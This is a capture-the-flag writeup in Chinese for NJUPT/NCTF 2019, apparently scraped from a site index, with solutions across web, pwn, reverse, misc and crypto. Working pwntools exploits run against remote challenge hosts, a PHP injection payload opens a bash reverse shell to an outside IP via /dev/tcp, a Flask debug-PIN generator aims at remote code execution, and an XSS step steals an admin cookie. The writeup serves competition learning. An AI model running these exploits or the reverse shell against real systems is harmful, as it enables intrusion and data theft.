zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 72 Origin: http://nctf2019.x1ct34m.com:40006 Connection: close Referer: http://nctf2019.x1ct34m.com:40006/index.php Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g Upgrade-Insecure-Requests: 1 sub=text&pat=e&rep=readfile(chr(47).chr(102).chr(108).chr(97).chr(103)); Pwn hello_pwn \u8fde\u63a5nc\u540e\u53d1\u73b0\u8ba9\u6211\u7528pwntools \u6784\u9020exp \u83b7\u5f97flag pwn_me_1 \u57fa\u7840\u6808\u6ea2\u51fa from pwn import * a=remote(\"139.129.76.65\",\"50004\") ad=0x400861 payload='yes\\0'+'a'*12+p64(0x66666666) a.sendline(payload) a.interactive() pwn_me_2 \u57fa\u7840\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 #coding:utf-8 from pwn import * path = './pwn_me_2' local = 0 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50005) p.recvuntil('but your name:\\n') p.send('%p'*15) p.recvuntil('preparing......\\n') base = int(p.recv(14),16) - (0x55f5229a5080-0x000055f5227a3000) log.success('base = '+hex(base)) target = base+0x2020e0 p.recvuntil('what do you want?\\n') payload = '%'+str(0x66)+'c%10$hhn'+'%'+str(0x666666-0x66)+'c%11$lln....'+p64(target)+p64(target+1) p.send(payload) #NCTF{rrr_loves_pwn_and_100years} if attach == 1: gdb.attach(p) p.interactive() pwn_me_3 \u57fa\u7840unlink #coding:utf-8 from pwn import * path = './pwn_me_3' local = 1 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50006) def add(size,content): p.recvuntil('5,exit\\n') p.sendline('1') p.recvuntil('size:\\n') p.sendline(str(size)) p.recvuntil('content:\\n') p.send(content) def delete(index): p.recvuntil('5,exit\\n') p.sendline('2') p.recvuntil('idx:\\n') p.sendline(str(index)) def show(index): p.recvuntil('5,exit\\n') p.sendline('3') p.recvuntil('idx\\n') p.sendline(str(index)) def edit(index,content): p.recvuntil('5,exit\\n') p.sendline('4') p.recvuntil('idx:\\n') p.sendline(str(index)) p.recvuntil('content:\\n') p.send(content) add(0x10,'\\x00'*0x10) #0 add(0x10,'\\x11'*0x10) #1 delete(0) delete(1) p.recvuntil('5,exit\\n') p.sendline('1') p.recvuntil('size:\\n') p.sendline('0') p.recvuntil('content:\\n') edit(0,'\\x50') show(0) heap_addr = u64(p.recvuntil('\\n',drop=True).ljust(8,'\\x00')) - 0x50 log.success('heap_addr = '+hex(heap_addr)) add(0x38,'\\x11'*0x30) #1 add(0xf0,'\\x22'*0xf0) #2 add(0x20,'\\x33'*0x20) #3 delete(1) payload = p64(0) + p64(0x31) + p64(0x6020e8-0x18) + p64(0x6020e8-0x10) + p64(0)*2 + p64(0x30) add(0x38,payload) delete(2) payload = p64(0)*2 + p64(heap_addr+0x10) edit(1,payload) edit(0,p64(0x66666666)) p.recvuntil('5,exit\\n') p.sendline('5') #NCTF{Ohh!h0pe_y0u_c4n_pwn_100years_too} if attach == 1: gdb.attach(p) p.interactive() warmup \u57fa\u7840rop #coding:utf-8 from pwn import * path = './warm_up' local = 1 attach = 0 P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50007) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p.recvuntil('p!!!\\n') p.send('\\x11'*0x18+'\\x12') p.recvuntil('\\x12') canary = u64(p.recv(7)+'\\x00') log.success('canary = '+hex(canary)) p.recvuntil('?') payload = p64(0)*3 + '\\x00' + p64(canary)[:7] payload+= p64(0) payload+= p64(0x400ab6) p.send(payload) p.recvuntil('warm up!!!') p.send('\\x11'*0x2f+'\\x12') p.recvuntil('\\x12') libcbase = u64(p.recv(6).ljust(8,'\\x00')) - libc.sym['__libc_start_main'] - 240 log.success('libcbase = '+hex(libcbase)) p_rdx_rsi = 0x00000000001150c9 + libcbase p_rdi = 0x400bc3 p_rbp = 0x400970 leave = 0x400a49 flag_addr = 0x601a00 + 0x98 p.recvuntil('?') payload = p64(0)*3 + '\\x00' + p64(canary)[:7] payload+= p64(0) payload+= p64(p_rdi) + p64(0) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601a00) payload+= p64(libcbase+libc.sym['read']) payload+= p64(p_rbp) + p64(0x601a00) payload+= p64(leave) p.send(payload) raw_input() payload = p64(0x601a00) payload+= p64(p_rdi) + p64(flag_addr) payload+= p64(p_rdx_rsi) + p64(0) + p64(0) payload+= p64(libcbase+libc.sym['open']) payload+= p64(p_rdi) + p64(3) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00) payload+= p64(libcbase+libc.sym['read']) payload+= p64(p_rdi) + p64(1) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00) payload+= p64(libcbase+libc.sym['write']) payload+= './flag' p.send(payload) if attach == 1: gdb.attach(p) p.interactive() easy_rop \u57fa\u7840rop #coding:utf-8 from pwn import * path = './easy_rop' local = 1 attach = 0 P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50002) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') for i in range(26): p.recvuntil(': ') p.sendline(str(0)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil('28 = ') base1 = int(p.recvuntil('\\n',drop=True),10) log.success('base1 = '+hex(base1)) p.recvuntil(': ') p.sendline('+') p.recvuntil('29 = ') base2 = int(p.recvuntil('\\n',drop=True),10) log.success('base2 = '+hex(base2)) base = str(hex(base2))+str(hex(base1))[2:] base = int(base,16) - (0x55e9d0e36b40-0x000055e9d0e36000) log.success('base = '+hex(base)) start = base + 0x8a0 start1 = str(hex(start))[2:6] start2 = str(hex(start))[6:] start1 = int(start1,16) start2 = int(start2,16) p.recvuntil(': ') p.sendline(str(start2)) p.recvuntil(': ') p.sendline(str(start1)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil('your name?\\n') p.send('\\x00') #====================================== for i in range(26): p.recvuntil(': ') p.sendline(str(0)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') target = base + 0x201420 target1 = str(hex(target))[2:6] target2 = str(hex(target))[6:] target1 = int(target1,16) target2 = int(target2,16) p.recvuntil(': ') p.sendline(str(target2)) p.recvuntil(': ') p.sendline(str(target1)) leave = base + 0xb31 leave1 = str(hex(leave))[2:6] leave2 = str(hex(leave))[6:] leave1 = int(leave1,16) leave2 = int(leave2,16) p.recvuntil(': ') p.sendline(str(leave2)) p.recvuntil(': ') p.sendline(str(leave1)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') part1 = base + 0xb96 part2 = base + 0xb80 def call_fun(fun_addr,arg1,arg2,arg3): payload = p64(part1) payload+= p64(0) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg1) payload+= p64(arg2) payload+= p64(arg3) payload+= p64(part2) payload+= 'a'*0x38 return payload p_rdi = base + 0xba3 p_rbp = base + 0x900 p.recvuntil('your name?\\n') payload = p64(target) payload+= p64(p_rdi) payload+= p64(P.got['puts']+base) payload+= p64(P.plt['puts']+base) payload+= call_fun(P.got['read']+base,0x100,base+0x201500,0) payload+= p64(p_rbp) payload+= p64(base+0x201500) payload+= p64(leave) p.send(payload) libcbase = u64(p.recv(6).ljust(8,'\\x00')) - libc.sym['puts'] log.success('libcbase = '+hex(libcbase)) payload = p64(base+0x201500) payload+= p64(p_rdi) payload+= p64(libcbase+libc.search('/bin/sh\\x00').next()) payload+= p64(libcbase+libc.sym['system']) p.send(payload) #NCTF{rop_1s_b4st!!!!} if attach == 1: gdb.attach(p) p.interactive() easy_heap \u4e24\u6b21fb_atk #coding:utf-8 from pwn import * path = './easy_heap' local = 1 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50001) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def new(size,content): p.recvuntil('4. exit\\n') p.sendline('1') p.recvuntil('size?\\n') p.sendline(str(size)) p.recvuntil('ontent?\\n') p.send(content) def delete(index): p.recvuntil('4. exit\\n') p.sendline('2') p.recvuntil('index?\\n') p.sendline(str(index)) def show(index): p.recvuntil('4. exit\\n') p.sendline('3') p.recvuntil('index?\\n') p.sendline(str(index)) p.recvuntil('your name?\\n') p.send(p64(0)+p64(0x60)) new(0x50,'\\x00'*0x50) #0 new(0x50,'\\x11'*0x50) #1 delete(0) delete(1) delete(0) new(0x50,p64(0x602060)) new(0x50,'\\x33'*0x50) new(0x50,'\\x44'*0x50) payload = p64(0) + p64(0x1000) + p64(0)*8 new(0x50,payload) new(0x80,'\\x00') #0 new(0x60,'\\x11'*0x60) #1 delete(0) show(0) p.recvuntil('0: ') libcbase = u64(p.recv(6).ljust(8,'\\x00')) - (0x7f54cfedab78-0x00007f54cfb16000) log.success('libcbase = '+hex(libcbase)) new(0x60,'\\x22'*0x60) delete(1) delete(2) delete(1) new(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23)) new(0x60,'\\x00') new(0x60,'\\x00') one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147] payload = '\\x00'*0x13 + p64(libcbase+one_gadget[2]) new(0x60,payload) delete(6) if attach == 1: gdb.attach(p) p.interactive() Re \u7b7e\u5230\u9898 IDA\u6253\u5f00 \u8fdb\u5230 sub_401340 \u4e2d \u5c31\u662f\u6709\u4e00\u4e2a7*7\u7684\u77e9\u9635\u548c\u6211\u4eec\u8f93\u5165\u768449\u4f4d\u5b57\u7b26\u7684ASCII\u7801\u6309\u5217\u6392\u5e03\u6784\u6210\u7684\u77e9\u9635(\u7b2c\u4e00\u5217\u662fa[0]~a[6])\u76f8\u4e58\u4f1a\u5f97\u5230dword_404000 \u9664\u4e86 dword_404000[0]=4884h \u5916\u90fd\u662f4\u884c\u4ee3\u8868\u4e00\u4e2a\u5143\u7d20,\u5373 dword_404000[1]=91C4h dword_404000[2]=7D35h dword_404000[3]=81FEh ... \u7136\u540e\u5c31\u662f\u6c42\u89e3\u975e\u9f50\u6b21\u7ebf\u6027\u65b9\u7a0b\u7ec4\u4e86 $$ \\left{ \\begin{matrix} 12 & 53 & 6 & 34 & 58 & 36 & 1 \\ 83 & 85 & 12 & 73 & 27 & 96 & 52 \\ 78 & 53 & 24 & 36 & 86 & 25 & 46 \\ 39 & 78 & 52 & 9 & 62 & 37 & 84 \\ 23 & 6 & 14 & 74 & 48 & 12 & 83 \\ 27 & 85 & 92 & 42 & 48 & 15 & 72 \\ 4 & 6 & 3 & 67 & 0 & 26 & 68 \\end{matrix} \\right} \\tag{1} $$ $$ \\left{ \\begin{matrix} a1[0] & a1[7] & a1[14] & a1[21] & a1[28] & a1[35] & a1[42] \\ a1[1] & a1[8] & a1[15] & a1[22] & a1[29] & a1[36] & a1[43] \\ a1[2] & a1[9] & a1[16] & a1[23] & a1[30] & a1[37] & a1[44] \\ a1[3] & a1[10] & a1[17] & a1[24] & a1[31] & a1[38] & a1[45] \\ a1[4] & a1[11] & a1[18] & a1[25] & a1[32] & a1[39] & a1[46] \\ a1[5] & a1[12] & a1[19] & a1[26] & a1[33] & a1[40] & a1[47] \\ a1[6] & a1[13] & a1[20] & a1[27] & a1[34] & a1[41] & a1[48] \\end{matrix} \\right} \\tag{2} $$ $$ \\left{ \\begin{matrix} d[0] & d[7] & d[14] & d[21] & d[28] & d[35] & d[42] \\ d[1] & d[8] & d[15] & d[22] & d[29] & d[36] & d[43] \\ d[2] & d[9] & d[16] & d[23] & d[30] & d[37] & d[44] \\ d[3] & d[10] & d[17] & d[24] & d[31] & d[38] & d[45] \\ d[4] & d[11] & d[18] & d[25] & d[32] & d[39] & d[46] \\ d[5] & d[12] & d[19] & d[26] & d[33] & d[40] & d[47] \\ d[6] & d[13] & d[20] & d[27] & d[34] & d[41] & d[48] \\end{matrix} \\right} \\tag{3} $$ (1) * (2) = (3) NCTF{nctf2019_linear_algebra_is_very_interesting} debug IDA\u6253\u5f00 \u6211\u6ca1\u622a\u56fe2333\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u901a\u8fc7\u52a8\u8c03\u6765\u5f97\u5230\u7b54\u6848\uff0c\u597d\u50cf\u662f\u4e2d\u9014\u751f\u6210flag\u6765\u548c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83 \u53ea\u9700\u8981\u518d\u6bd4\u8f83\u7684\u5730\u65b9\u4e0b\u65ad\u70b9\uff0c\u67e5\u770b\u6808\u5373\u53ef\u5f97\u5230\u7b54\u6848\u3002 Easy Ternary AHK\u811a\u672c\u8bed\u8a00\u5f88\u660e\u767d\u4e86\uff0c\u76f4\u63a5\u5230exe\u91cc\u628a\u811a\u672c\u63d0\u51fa\u6765 XOR(a, b) { tempA := a tempB := b ret := 0 Loop, 8 { ret += Mod((((tempA >> ((A_Index - 1)*4)) & 15) + ((tempB >> ((A_Index - 1)*4)) & 15)),3) * (16**(A_Index-1)) } return ret } InputBox, userInput, TTTTCL, Input your flag: if(ErrorLevel) Exit if(!StrLen(userInput)) #\u6ca1\u6709\u8bfb\u5165 { MsgBox, GG Exit } inputArr := [] #\u4fdd\u5b58\u8f93\u5165\u7684\u6570\u636e Loop, parse, userInput { temp:=A_Index inputArr.Push(Ord(A_LoopField)) #\u8bfb\u5165\u8bfb\u5165\u6846 } inputNum := [] #\u64cd\u4f5c\u540e\u4fdd\u5b58\u7684\u6570\u7ec4 Loop % inputArr.Length() { temp := inputArr[A_Index] temp := DllCall(\"aiQG.dll\\?ToTrit@@YAII@Z\", \"UInt\", temp) inputNum.push(temp) } key1 := XOR(inputNum[5], inputNum[inputNum.Length()]) #key\u5c31\u662f{}\u7684XOR inputFlag := [] Loop % inputArr.Length() { temp := XOR(inputNum[A_Index], key1) if(Mod(A_Index,2)) { temp := XOR(key1,temp) } inputFlag.push(temp) } temp1 := 1 #\u662f\u5426\u6210\u529f Loop % inputFlag.Length() #\u68c0\u9a8c { temp := inputFlag[A_Index] temp := DllCall(\"aiQG.dll\\?Check@@YAIII@Z\", \"UInt\", temp, \"UInt\", A_Index) if(!temp) { temp1 := 0 } } if(temp1) { MsgBox, Ok } if(!temp1) { MsgBox, GG } \u8c03\u7528\u4e86dll,\u9006\u5411dll\uff0c\u53d1\u73b0\u5c31\u4e00\u4e2a\u5bf9\u6bd4\u6570\u5b57\u548c\u8f6c\u4e09\u8fdb\u5236 exp\uff1a #include<cstdio> #include<cmath> #include<windows.h> using namespace std; int xors(int a,int b) { int ret=0; for(int i=1;i<=8;i++) ret=ret+(((a>>(((i-1)*4))&15)+((b>>((i-1)*4))&15))%3)*(pow(16,(i-1))); return ret; } int change(int x) { int t,ans=0,k=0; while(x) { t=x%10; ans=ans+pow(3,k++)*t; x/=10; } return ans; } void genS() { int data[100]={0x00,0x10011,0x21020,0x21101,0x21000,0x22211,0x2220,0x21200,0x2101,0x22120,0x20122,0x22220,0x2021,0x10122,0x20102,0x22111,0x211,0x12012,0x2210,0x22202,0x2021,0x21101,0x2222,0x21101,0x2222,0x21121,0x21120,0x22210}; for(int c=1;c<=27;c++) { for(int i=0;i<=0x22222222;i++) { int t=xors(i,0x22212); if(c%2) t=xors(0x22212,t); if(t==data[c]) { printf(\"%X,\",i); break; } } } } int main() { int s[1000]={2220,2111,10010,2121,11120,10011,10112,10222,11002,1210,11102,10112,2001,1220,11020,11002,1221,10001,11111,10112,10010,10010,10010,10010,10000,2211,11122,0}; for(int i=0;s[i]!=0;i++) printf(\"%c\",change(s[i])); return 0; } \u4e11\u964b\u7684\u4ee3\u7801 \u786e\u5b9e\u591f\u4e11\u964b\u7684\uff0c\u5230\u5904\u8df3\u8f6c IDA\u6253\u5f00\u540e\u53d1\u73b0\u6709\u53cd\u8c03\u8bd5\uff0cnop\u6389\uff0c\u53d1\u73b0\u539f\u6765\u65e0\u6cd5\u8fd0\u884c\u7684\u51fd\u6570\u53ef\u4ee5\u8fd0\u884c\u4e86(\u4e4b\u524d\u5f02\u6216\u4e86) \u9274\u4e8e\u65e0\u6cd5F5\uff0c\u5f00\u59cb\u5934\u94c1\u65f6\u95f4\uff0c\u53d1\u73b0\u6700\u540e\u5c31\u662f\u4e2aTEA #include<cstdio> #define _DWORD int using namespace std; unsigned char code[]={0x88,0x71,0x3E,0xFE,0x66,0xF6,0x77,0xD7,0xA0,0x51,0x29,0xF9,0x11,0x79,0x71,0x49,0xF1,0x61,0xA0,0x9,0xF1,0x29,0x1,0xB1}; /* tea_decrypt(0x61869F5E,0x0A9CF08D); tea_decrypt(0xAD74C0CA,0xA57F16B8); tea_decrypt(0xB559626D,0xD17B68E0);*/ int getlowbit(int x) { return x&0xFF; } void tea_decrypt(unsigned long v0,unsigned long v1) { unsigned long sum=0xC6EF3720,i; unsigned long delta=0x9e3779b9; unsigned long k0=0x12345678,k1=0xBADF00D,k2=0x05201314,k3=0x87654321; for(i=0;i<32;i++) { v1-=((v0<<4)+k2)^(v0+sum)^((v0>>5)+k3); v0-=((v1<<4)+k0)^(v1+sum)^((v1>>5)+k1); sum-=delta; } unsigned char* v=((unsigned char*)&v0); printf(\"0x%X 0x%X 0x%X 0x%X\\n\",getlowbit(*((char*)v)),getlowbit(*((char*)v+1)),getlowbit(*((char*)v+2)),getlowbit(*((char*)v+3))); v=((unsigned char*)&v1); printf(\"0x%X 0x%X 0x%X 0x%X\\n\",getlowbit(*((char*)v)),getlowbit(*((char*)v+1)),getlowbit(*((char*)v+2)),getlowbit(*((char*)v+3))); } unsigned char encode(unsigned char c) { int a=c>>5,b=c<<3; return ((a|b)^0x5A); } int main() { for(int i=0;i<24;i++) { int c=code[i]; for(int j=0;j<=0xFF;j++) if(c==encode(j)) { int t=j; if(i==0 || i==4) t-=0xC; if(i==1 || i==5) t-=0x22; if(i==2 || i==6) t-=0x38; if(i==3 || i==7) t-=0x4E; printf(\"%c\",t); } } return 0; } F-Bird \u5f00\u5386\u53f2\u7684\u5012\u8f66\uff0c16\u4f4d\u90fd\u6765\u4e86 \u76f4\u63a5\u770b\u6c47\u7f16\uff0c\u6709\u4e00\u6bb5\u5f02\u6216\uff0c\u4e0d\u8fc7\u7528bx\u5bc4\u5b58\u5668\u9ad8\u4f4e\u4f4d\u4f9d\u6b21\u5f02\u6216 \u7b97\u51fa\u6765\u4e24\u4e2a\u5f02\u6216\u7684\u6570\u662f\u591a\u5c11 \u7136\u540e\u5f02\u6216\u5c31\u884c\u4e86 k=[0x8E,0x9D,0x94,0x98,0xBB,0x89,0xF3,0xEF,0x83,0xEE,0xAD,0x9B,0x9F,0x9A,0xF0,0xEB,0x9F,0x97,0xF6,0xBC,0xF1,0xE9,0x9F,0xE7,0xA1,0xB3,0xF3,0xA3] i=0 flag=\"\" for c in k: if(i&1): flag=flag+chr(c^0xde) else: flag=flag+chr(c^0xc0) i=i+1 print(flag) Misc NCTF2019\u95ee\u5377\u8c03\u67e5 \u586b\u8868\uff0c\u586b\u5b8c\u5c31\u51faflag PiP2 install \u5148\u5229\u7528\u865a\u62df\u673a\u8fde\u63a5\u4e00\u4e0b\u3002[\u56fe\u7247] \u6211\u5df2\u7ecf\u4e0b\u8fc7\u4e86 \u4e0b\u8f7d\u7684\u8fc7\u7a0b\u4e2d\u6709\u4e00\u4e2a\u94fe\u63a5\u51fa\u6765\u4e86\u3002 win\u4e0b\u6253\u5f00\u5b83\uff01 \u5b58\u5728\u4e00\u4e2asetup.py \u4e2d\u95f4\u6709\u4e00\u4e32\u4e0d\u77e5\u6240\u4e91\u7684\u5b57\u7b26\u4e32\u3002 \u76f4\u63a5base64\u89e3\u5bc6\u5c31\u53ef\u4ee5\u4e86 a_good_idea \u4e00\u5f20\u56fe\u7247\u3002\u60f3\u90fd\u4e0d\u8981\u60f3\u76f4\u63a5binwalk [\u56fe\u7247] \u6709\u4e24\u5f20\u56fe\u7247\uff0chint\u662f\u5bfb\u627e\u50cf\u7d20\u7684\u79d8\u5bc6\u3002 \u90a3\u5c31stegsolve\u4e00\u4e0bcombine\u4e24\u5f20\u56fe\u7247\u7136\u540e\u5de6\u53f3\u5207\u6362\u901a\u9053\u4e00\u6b21\u5c31\u5f97\u5230\u4e8c\u7ef4\u7801\u4e86 \u626b\u63cf\u5373\u53ef what`s this \u6d41\u91cf\u5206\u6790\u76f4\u63a5\u770bhttp\u534f\u8bae\u3002\u5168\u90e8\u5bfc\u51fa\u540e\u5f97\u5230\u6709\u4e00\u4e2azip\u6587\u4ef6\u5305\u91cc\u9762\u5305\u542b\u4e86\u4e00\u4e2awhat 1s th1s .txt\u91cc\u9762\u683c\u5f0f\u4e0ebase64\u9690\u5199\u5f88\u50cf\u76f4\u63a5py\u8fd0\u884c [\u56fe\u7247] Become a Rockstar \u4e0b\u8f7d\u5f97\u5230\u4e00\u4e2arock\u6587\u4ef6 \u4e00\u756a~~\u767e\u5ea6~~Bing\u540e\u4e86\u89e3\u5230Rockstar\u8fd9\u4e2a\u7f16\u7a0b\u8bed\u8a00 https://github.com/RockstarLang/rockstar https://github.com/yyyyyyyyyyan/rockstar-py \u4f7f\u7528rockstar-py rockstar-py Become_a_Rockstar.rock \u5f97\u5230\u4e00\u6bb5python\u4ee3\u7801 Leonard_Adleman = \"star\" Problem_Makers = 76 Problem_Makers = \"NCTF{\" def God(World): a_boy = \"flag\" the_boy = 3 def Evil(your_mind): a_girl = \"no flag\" the_girl = 5 Truths = 3694 Bob = \"ar\" Adi_Shamir = \"rock\" def Love(Alice, Bob): Mallory = 13 Mallory = 24 Everything = 114514 Alice = \"you\" def Reality(God, Evil): God = 26 Evil = 235 Ron_Rivest = \"nice\" def You_Want_To(Alice, Love, Anything): You = 5.75428 your_heart = input() You = 5 your_mind = input() Nothing = 31 if Truths * Nothing == Everything: RSA = Ron_Rivest + Adi_Shamir + Leonard_Adleman if Everything / Nothing == Truths: Problem_Makers = Problem_Makers + Alice + Bob print(Problem_Makers) the_flag = 245 the_confusion = 244 print(RSA) Mysterious_One = \"}\" print(Mysterious_One) This = 4 This = 35 This = 7 This = 3 This = 3 This = 37 \u8dd1\u4e00\u4e0bflag\u5c31\u51fa\u6765\u4e86 NCTF{youarnicerockstar} \u5c0f\u72d7\u7684\u79d8\u5bc6 \u53c8\u4e00\u4e2a\u6d41\u91cf\u5206\u6790\u76f4\u63a5\u5bfchttp\u53d1\u73b0\u5305\u91cc\u5b58\u5728\u4e00\u4e2a1.html\u6253\u5f00\u90fd\u662f \u76f4\u63a5\u8f6ctxt\u731c\u6d4b\u662f\u56fe\u7247RGB \u5229\u7528python\u811a\u672c\u8f6c\u6210\u56fe\u7247\u53ef\u6700\u7ec8\u5f97\u5230flag. 2077 \u76f4\u63a5 Google Cyberpunk 2077 stream decode. \u7136\u540e\u5728\u4e00\u4e2a reddit \u5e16\u5b50 \u4e2d\uff0c\u627e\u5230\u56fe\u7247\u4e0b\u8f7d\u5730\u5740\u3002\u4e0b\u8f7d\u540e\u7528 sha256sum \u6c42 sha256 \u503c\u5373\u53ef\u3002 Crypto keyboard \u770b\u5230\u8fd9\u91cc\u603b\u5171\u67098\u4e2a\u5b57\u6bcd\uff0c\u6700\u591a\u91cd\u590d\u4e864\u6b21\uff0c\u89c9\u5f97\u5c31\u5bf9\u5e94\u4e86\u624b\u673a\u952e\u76d8\u4e2d\u7684\u4e5d\u5bab\u8f93\u5165\u6cd5\uff0c\u53bb\u624b\u8bd5\u4e86\u8bd5\uff0c\u524d\u9762\u5c31\u51fa\u6765\u4e86youare\uff0c\u4e8e\u662f\u5199\u4e86\u4e2a\u7a0b\u5e8f\u7801\u4e86\u51fa\u6765 #include <cstdio> #include <cstring> char a[100][5]={\"ooo\",\"yyy\",\"ii\",\"w\",\"uuu\",\"ee\",\"uuuu\",\"yyy\",\"uuuu\",\"y\",\"w\",\"uuu\",\"i\",\"i\",\"rr\",\"w\",\"i\",\"i\",\"rr\",\"rrr\",\"uuuu\",\"rrr\",\"uuuu\",\"t\",\"ii\",\"uuuu\",\"i\",\"w\",\"u\",\"rrr\",\"ee\",\"www\",\"ee\",\"yyy\",\"eee\",\"www\",\"w\",\"tt\",\"ee\"}; char b[100][5]={\"w\",\"ww\",\"www\",\"e\",\"ee\",\"eee\",\"r\",\"rr\",\"rrr\",\"t\",\"tt\",\"ttt\",\"y\",\"yy\",\"yyy\",\"u\",\"uu\",\"uuu\",\"uuuu\",\"i\",\"ii\",\"iii\",\"o\",\"oo\",\"ooo\",\"oooo\"}; char c[27]=\"abcdefghijklmnopqrstuvwxyz\"; int main() { for(int i=0;i<=38;++i) { for(int j=0;j<=25;++j) { if(strcmp(a[i],b[j])==0) { printf(\"%c\",c[j]); break; } } } return 0; } youaresosmartthatthisisjustapieceofcake","title":"NJUPT CTF \u5929\u7487Writeup"},{"location":"writeup/NJUPT-2019/#njupt-ctf-writeup","text":"","title":"NJUPT CTF \u5929\u7487Writeup"},{"location":"writeup/NJUPT-2019/#web","text":"","title":"Web"},{"location":"writeup/NJUPT-2019/#hacker_backdoor","text":"\u8fd9\u91cc\u662fdisable_function\u5fd8\u8bb0\u6dfb\u52a0proc_open\uff0c\u7528curl\u5e26\u51fa\u6765\u5c31\u597d import requests url = \"http://nctf2019.x1ct34m.com:60004/?useful=/etc/passwd&code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();\" print requests.post(url,data={'a':\"\"\" $descriptorspec=array( 0=>array('pipe','r'), //STDIN 1=>array('pipe','w'),//STDOUT 2=>array('pipe','w') //STDERROR ); $handle=proc_open('bash -c \"bash -i >& /dev/tcp/122.152.230.160/2333 0>&1\"',$descriptorspec,$pipes,NULL); var_dump($handle); \"\"\"}).text","title":"hacker_backdoor"},{"location":"writeup/NJUPT-2019/#simple-xss","text":"\u968f\u4fbf\u6ce8\u518c\u540e\u53d1\u73b0\u76f4\u63a5\u53ef\u4ee5XSS\uff0c\u4f46\u662f\u6ca1\u6709\u4efb\u4f55\u65b9\u5411\uff0c\u8fd9\u4e2a\u65f6\u5019admin\u8d26\u6237\u88ab\u6ce8\u518c\u8fc7\u4e86\uff0c\u60f3\u6cd5\u662f\u76f4\u63a5\u7528admin\u7684cookie\u767b\u5165\uff0c\u642d\u5efa\u597d\u5e73\u53f0\u540e\uff0c\u5411admin\u53d1\u9001XSS payload\uff0c\u77ac\u95f4\u770b\u5230\u4e86admin\u7684cookie. burp\u5c06\u5176\u81ea\u5df1\u7528\u6237\u7684COOKIE\u66ff\u6362\u6210\u4e3aadmin\u7684cookie\uff0c\u5f97\u5230flag\uff1aNCTF{Th1s_is_a_Simple_xss}","title":"simple XSS"},{"location":"writeup/NJUPT-2019/#flask_website","text":"\u4efb\u610f\u6587\u4ef6\u8bfb+PIN-Debug\uff0cdocker\u6a21\u5f0f\u4e0bmachine\u2014id\u6709\u53d8\u5316\u3002\u66f4\u65b0\u811a\u672c\u5373\u53ef \u53c2\u8003\u6587\u732e\uff1a Flask debug pin\u5b89\u5168\u95ee\u9898 #!/usr/bin/python2.7 #coding:utf-8 from sys import * import requests import re from itertools import chain import hashlib def genpin(mac,mid): probably_public_bits = [ 'ctf',# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] mac = \"0x\"+mac.replace(\":\",\"\") mac = int(mac,16) private_bits = [ str(mac),# str(uuid.getnode()), /sys/class/net/eth0/address str(mid)# get_machine_id(), /proc/sys/kernel/random/boot_id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num return rv # 02:42:ac:16:00:02 /sys/class/net/eth0/address # 21e83dfd-206c-4e80-86be-e8d0afc467a1 /proc/sys/kernel/random/boot_id def getcode(content): try: return re.findall(r\"<pre>([\\s\\S]*)</pre>\",content)[0].split()[0] except: return '' def getshell(): print genpin(\"02:42:ac:16:00:02\",\"8657e88ac278e9225ba324bb8033ca3398c16c7b517417b55c1f164e90d97a46\") if __name__ == '__main__': 